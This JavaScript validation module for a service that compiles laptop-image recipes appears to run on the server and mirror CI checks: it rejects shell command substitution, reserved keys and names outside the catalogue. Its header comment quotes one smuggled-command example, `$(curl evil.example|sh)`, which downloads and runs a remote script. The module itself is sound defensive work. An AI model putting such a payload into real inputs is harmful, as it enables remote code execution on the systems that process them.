/**
 * The rules a JSON Schema cannot carry, applied on the server.
 *
 * WHAT THIS FIXES
 * `/order-submit` used to run `recipe.schema.json` and stop, while CI ran that schema AND
 * `auros-recipes/src/validate.ts`. The schema document was byte-identical on both sides; the
 * VALIDATION was not. So the Worker accepted recipes CI refused — `for:` text containing
 * `$(curl evil.example|sh)`, an application not in the catalogue, a language with no catalogue row —
 * and then said, in its own refusal text, "This is the same schema auros-recipes validates with in
 * CI". That sentence has to be true at the moment the customer is most inclined to believe it, and
 * it was not: an order the Worker blessed, turned into a public pull request and created a Stripe
 * Checkout session for could be rejected by the CI it had claimed the order already satisfied.
 *
 * WHY IT IS NOT A SECOND SET OF RULES
 * Every rule below reads a vendored data file rather than restating a decision:
 *
 *   reserved key families  schema/reserved-families.json, byte-identical to auros-recipes'
 *   catalogue membership   catalogue/catalogue.json, derived from auros-recipes/catalogue/*.tsv
 *   command substitution   one regex, and it is the same three characters on both sides
 *
 * `worker/test/rules-parity.test.js` puts the same documents through this module and through the
 * real `auros-recipes` validator and fails if they disagree. Drift is a red test, not a surprise in
 * a pull request.
 *
 * WHAT DELIBERATELY STAYS IN CI
 * Anything that needs the compiler or the filesystem: the prune plan, protected-package assertions,
 * the folder-matches-name check, kiosk candidate resolution. Those cannot run in a Worker at all, so
 * `routes/order.js` claims only what this module actually checked — see the note it returns.
 */

import families from '../schema/reserved-families.json' with { type: 'json' }
import catalogue from '../catalogue/catalogue.json' with { type: 'json' }

/** The same three characters `auros-recipes/src/validate.ts` refuses, for the same reason. */
const COMMAND_SUBSTITUTION = /`|\$\(|\$\{/

const FREE_TEXT_TITLE = 'Nothing a person writes here reaches a shell'
const FREE_TEXT_WHY =
  'The compiler writes every human string into the image as base64-encoded data, so no byte a ' +
  'customer wrote is ever seen by a shell. This refusal is the second half of that: a string ' +
  'containing command substitution is either an attack or a paste accident, and a school login ' +
  'screen is not where we find out which. Orders arrive here as pull requests from strangers.'

const APP_TITLE = 'An application reaches a machine only by being in the catalogue'
const APP_WHY =
  'An application reaches a machine only by being named in a recipe, and a name that resolves to ' +
  'nothing would produce a file that promises an application and a laptop that does not have it. ' +
  'There is deliberately no free-text package field to fall back on: three different spellings of ' +
  'the same product are three different security surfaces, and the person reading the file cannot ' +
  'tell which one they got.'

const LANGUAGE_TITLE = 'A language has to be one the image can actually draw'
const LANGUAGE_WHY =
  'A language is not a label on a settings screen. It selects a locale and the font packages that ' +
  'make the script render at all, and both come from catalogue/languages.tsv. A language with no row ' +
  'there produces a perfectly valid file and a first-boot screen of empty boxes, which is the worst ' +
  'possible first impression and the one nobody is watching. Adding a language is a change a person ' +
  'reviews, not a string a form accepts.'

const KEYBOARD_TITLE = 'A keyboard layout has to be one the compiler can write into the image'
const KEYBOARD_WHY =
  'A layout that is not in catalogue/keyboards.tsv has no xkb name, so the compiler would have ' +
  'nothing to write and the machine would come up with whatever the base image defaults to. A fleet ' +
  'whose primary layout cannot type a password is a fleet nobody can log into.'

const GROUP_TITLE = 'Removal has one vocabulary and this is not a word in it'
const GROUP_WHY =
  'The named groups in catalogue/groups.tsv are the entire vocabulary of removal. Nothing the ' +
  'machine needs in order to start, update itself, verify what it installs, reach the network or ' +
  'roll back a failed update appears in any of them, which is why there is no way to write the ' +
  'sentence that bricks a fleet. A group that is not in the file is a deletion nobody has decided.'

const sets = {
  apps: new Set(catalogue.apps),
  languages: new Set(catalogue.languages),
  layouts: new Set(catalogue.layouts),
  toggles: new Set(catalogue.toggles),
  groups: new Set(catalogue.groups)
}

/**
 * @typedef {import('./jsonschema.js').ValidationError} ValidationError
 */

/** @param {string} path @param {string} message @param {string} title @param {string} reason */
function refusal (path, message, title, reason) {
  // `keyword: 'refusal'` rather than a borrowed JSON Schema keyword. These rules are not keywords
  // that fired; pretending otherwise would make the error shape lie about where the rule lives, and
  // `presentRefusal` sorts on this value to decide which argument the reader sees first.
  return { path, keyword: 'refusal', message, title, reason }
}

function normalise (key) {
  return key.toLowerCase().replace(/[^a-z0-9]/g, '')
}

/** @param {string} key */
export function familyFor (key) {
  const n = normalise(key)
  for (const family of families.families) if (family.exact.includes(n)) return family
  for (const family of families.families) for (const needle of family.contains) if (n.includes(needle)) return family
  return null
}

/**
 * Every property name the schema declares anywhere. The same derivation as
 * `collectKnownKeys` in auros-recipes/src/schema.ts, so "unknown key" means the same thing on both
 * sides.
 * @param {any} node @param {Set<string>} [out]
 */
export function collectKnownKeys (node, out = new Set()) {
  if (Array.isArray(node)) { for (const child of node) collectKnownKeys(child, out); return out }
  if (typeof node !== 'object' || node === null) return out
  const props = node.properties
  if (typeof props === 'object' && props !== null) for (const key of Object.keys(props)) out.add(key)
  if (Array.isArray(node.required)) for (const key of node.required) if (typeof key === 'string') out.add(key)
  for (const value of Object.values(node)) collectKnownKeys(value, out)
  return out
}

/** Keys `$defs/refusals` already names, which have a better sentence than any family detector. */
export function reservedByName (schema) {
  const out = new Set()
  const refusals = schema?.$defs?.refusals
  if (typeof refusals !== 'object' || refusals === null) return out
  for (const group of Object.values(refusals)) {
    const branches = group?.not?.anyOf
    if (!Array.isArray(branches)) continue
    for (const branch of branches) {
      if (Array.isArray(branch?.required) && typeof branch.required[0] === 'string') out.add(branch.required[0])
    }
  }
  return out
}

/** A JSON Pointer from a path of keys and indices. */
function pointer (parts) {
  if (parts.length === 0) return '/'
  return '/' + parts.map(p => String(p).replace(/~/g, '~0').replace(/\//g, '~1')).join('/')
}

/**
 * Walk every string in the document and refuse command substitution anywhere in it.
 * @param {unknown} doc
 * @returns {ValidationError[]}
 */
export function freeTextRefusals (doc) {
  /** @type {ValidationError[]} */
  const out = []
  const walk = (node, path, depth) => {
    if (depth > 12) return
    if (typeof node === 'string') {
      if (COMMAND_SUBSTITUTION.test(node)) {
        out.push(refusal(pointer(path), 'This text contains shell command substitution (a backtick, $( or ${ ).', FREE_TEXT_TITLE, FREE_TEXT_WHY))
      }
      return
    }
    if (Array.isArray(node)) { node.forEach((child, i) => walk(child, [...path, i], depth + 1)); return }
    if (typeof node === 'object' && node !== null) {
      for (const [key, value] of Object.entries(node)) walk(value, [...path, key], depth + 1)
    }
  }
  walk(doc, [], 0)
  return out
}

/**
 * Unknown keys that belong to a reserved family, reported with the family's own paragraph rather
 * than as "unexpected property".
 * @param {unknown} doc @param {Set<string>} known @param {Set<string>} alreadyNamed
 * @returns {ValidationError[]}
 */
export function reservedKeyRefusals (doc, known, alreadyNamed) {
  /** @type {ValidationError[]} */
  const out = []
  const seen = new Set()
  const walk = (node, path, depth) => {
    if (depth > 12) return
    if (Array.isArray(node)) { node.forEach((child, i) => walk(child, [...path, i], depth + 1)); return }
    if (typeof node !== 'object' || node === null) return
    for (const [key, value] of Object.entries(node)) {
      if (!known.has(key) && !alreadyNamed.has(key)) {
        const family = familyFor(key)
        if (family) {
          const at = pointer([...path, key])
          if (!seen.has(at)) {
            seen.add(at)
            out.push(refusal(at, `${family.title} -- there is no '${key}' field, and that is the point.`, family.title, family.why))
          }
        }
      }
      walk(value, [...path, key], depth + 1)
    }
  }
  walk(doc, [], 0)
  return out
}

/**
 * Does every name in this recipe resolve to a catalogue row?
 * @param {Record<string, any>} recipe
 * @returns {ValidationError[]}
 */
export function catalogueRefusals (recipe) {
  /** @type {ValidationError[]} */
  const out = []
  const one = (value, path, set, title, why, what) => {
    if (typeof value !== 'string' || value.length === 0) return
    if (!set.has(value)) out.push(refusal(pointer(path), `'${value}' is not ${what}.`, title, why))
  }

  if (Array.isArray(recipe.apps)) {
    recipe.apps.forEach((name, i) => one(name, ['apps', i], sets.apps, APP_TITLE, APP_WHY, 'in the catalogue of applications this base image can install'))
  }
  one(recipe.language, ['language'], sets.languages, LANGUAGE_TITLE, LANGUAGE_WHY, 'a language in catalogue/languages.tsv')
  if (Array.isArray(recipe.other_languages)) {
    recipe.other_languages.forEach((name, i) => one(name, ['other_languages', i], sets.languages, LANGUAGE_TITLE, LANGUAGE_WHY, 'a language in catalogue/languages.tsv'))
  }
  one(recipe.keyboard, ['keyboard'], sets.layouts, KEYBOARD_TITLE, KEYBOARD_WHY, 'a keyboard layout in catalogue/keyboards.tsv')
  one(recipe.second_script, ['second_script'], sets.layouts, KEYBOARD_TITLE, KEYBOARD_WHY, 'a keyboard layout in catalogue/keyboards.tsv')
  one(recipe.switch_scripts_with, ['switch_scripts_with'], sets.toggles, KEYBOARD_TITLE, KEYBOARD_WHY, 'a switch combination in catalogue/keyboards.tsv')

  const prune = recipe.prune
  if (prune !== null && typeof prune === 'object') {
    for (const field of ['also_keep', 'also_remove']) {
      const list = prune[field]
      if (!Array.isArray(list)) continue
      list.forEach((group, i) => one(group, ['prune', field, i], sets.groups, GROUP_TITLE, GROUP_WHY, 'a group in catalogue/groups.tsv'))
    }
  }
  return out
}

/** The provenance of what this module validates against, for the honest note on a refusal. */
export const PROVENANCE = {
  families: families.families.length,
  apps: catalogue.apps.length,
  languages: catalogue.languages.length,
  catalogueSources: catalogue.source
}
